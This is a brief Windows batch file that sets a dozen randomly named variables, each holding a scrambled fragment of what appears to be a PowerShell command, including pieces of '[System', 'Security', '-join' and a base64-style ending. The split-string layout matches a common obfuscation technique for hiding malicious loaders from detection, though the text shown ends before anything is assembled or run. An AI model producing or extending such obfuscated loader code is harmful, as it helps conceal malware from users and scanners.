@echo off
set "xLpaRvjgze=$LFK"
set "DFkveTrQwh=Secu"
set "RFlkOHxfbO=oint"
set "BvyyRcqeGF=trea"
set "pgQhYuRmmu=ay()"
set "iYnnnDdffe=rInD"
set "dHcwWHJPCZ=-joi"
set "jKFIsEOWjt=th('"
set "GSIDpmaTwN=yrIn"
set "uTCawEdhcN=[Sys"
set "BCfQzHgBWk=EmWW"
set "fWWTpzDzKc===')"
